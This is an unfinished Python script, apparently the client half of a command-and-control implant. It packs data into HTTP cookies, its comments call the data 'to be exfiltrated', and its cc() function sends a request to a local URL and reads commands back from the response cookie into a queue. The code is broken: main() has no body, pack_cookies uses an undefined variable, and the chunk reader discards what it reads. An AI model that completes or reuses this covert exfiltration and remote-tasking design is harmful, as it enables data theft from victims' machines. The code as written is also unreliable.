from queue import Queue
from sys import getsizeof
import os
import io
from tokenize import cookie_re
import requests


url = "http://127.0.0.1:8080/api"

commands = Queue()


def main():

    # read queue

    # create cookie

    # 

def pack_cookies() -> dict:
    # prepare data to be exfiltrated
    cookies = {         # Max cookie size 4093 bytes
        '1': 'id',  # Id
        '2': 'type',  # Type
        '3': 'frame'   # Frame
    }
    print(getsizeof(cookies))
    

    if isinstance(data, io.BufferedReader):
        pass
    if isinstance(data, str):
        pass

    return cookies


def cc(cookies: dict):
    r = requests.get(url, cookies=cookies)
    # extract instructions from CC
    commands.put( r.cookies.get("0") )


def read_file(filename: str):
    file = open(filename, "rb")
    return file


def read_chunk_of_file(stream, size):
    stream.read(size)
    pass
